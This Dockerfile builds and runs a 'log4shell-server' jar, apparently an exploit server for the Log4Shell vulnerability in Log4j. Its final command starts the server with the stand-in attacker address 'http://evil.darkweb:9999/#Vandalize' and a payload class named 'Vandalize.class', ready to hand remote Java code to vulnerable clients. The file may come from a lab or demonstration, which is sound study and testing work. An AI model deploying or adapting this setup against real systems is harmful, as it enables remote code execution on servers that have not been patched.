# Stage 1: Build the project using Maven
FROM maven:3.9.5-eclipse-temurin-17-alpine as build
# Use the latest stable Maven (3.9.5) and JDK 17 (Eclipse Temurin).

# Copy the Maven project files
COPY pom.xml pom.xml
COPY src src

# Build the project with cached dependencies
RUN --mount=type=cache,target=/root/.m2 mvn clean package

# Stage 2: Run the application using the latest stable JDK
FROM eclipse-temurin:17-jdk-alpine as ldap
# Use the latest stable JDK 17 with Alpine for a smaller image.

# Copy the packaged jar from the build stage
COPY --from=build target/log4shell-server-*-jar-with-dependencies.jar /server.jar

# Expose the necessary ports
EXPOSE 8000
EXPOSE 9999

# Command to run the application
CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#Vandalize", "8000", "9999", "Vandalize.class"]
